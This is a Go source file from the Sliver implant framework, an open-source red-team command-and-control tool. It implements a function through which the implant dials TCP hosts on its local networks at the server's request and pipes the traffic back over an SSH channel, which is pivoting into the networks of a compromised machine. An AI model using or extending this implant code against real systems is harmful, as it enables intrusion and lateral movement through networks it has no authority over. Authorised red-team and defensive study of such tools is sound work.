package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"

	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/commpb"
)

// dialTCP - A connection coming from the server is destined to one of the implant's networks.
// Forge local and/or remote TCP addresses and pass them to the dialer. Pipe the connection.
func dialTCP(info *commpb.Conn, ch ssh.NewChannel) error {

	// Use the corresponding source address if available.
	// Commented out now for testing purposes on a local machine.
	var laddr *net.TCPAddr
	// if info.LHost != "" && info.LPort != 0 {
	//         ip := net.ParseIP(info.LHost)
	//         if ip != nil {
	//                 laddr = &net.TCPAddr{IP: ip, Port: int(info.LPort)}
	//         }
	// }

	// We need the destination anyway.
	raddr := &net.TCPAddr{
		IP:   net.ParseIP(info.RHost),
		Port: int(info.RPort),
	}

	// {{if .Config.Debug}}
	log.Printf("Dialing TCP on %s:%d", info.RHost, info.RPort)
	// {{end}}

	// Get a conn to destination.
	dst, err := net.DialTCP("tcp", laddr, raddr)
	if err != nil {
		// We should return an error to the server.
		return err
	}

	// Accept stream and pipe
	src, reqs, err := ch.Accept()
	if err != nil {
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
			// {{end}}
		}
	}
	go ssh.DiscardRequests(reqs)

	// Pipe connections. Blocking until EOF or any other error
	transportConn(src, dst)

	// Close connections once we're done, with a delay left so our
	// custom RPC tunnel has time to transmit the remaining data.
	closeConnections(src, dst)

	return nil
}
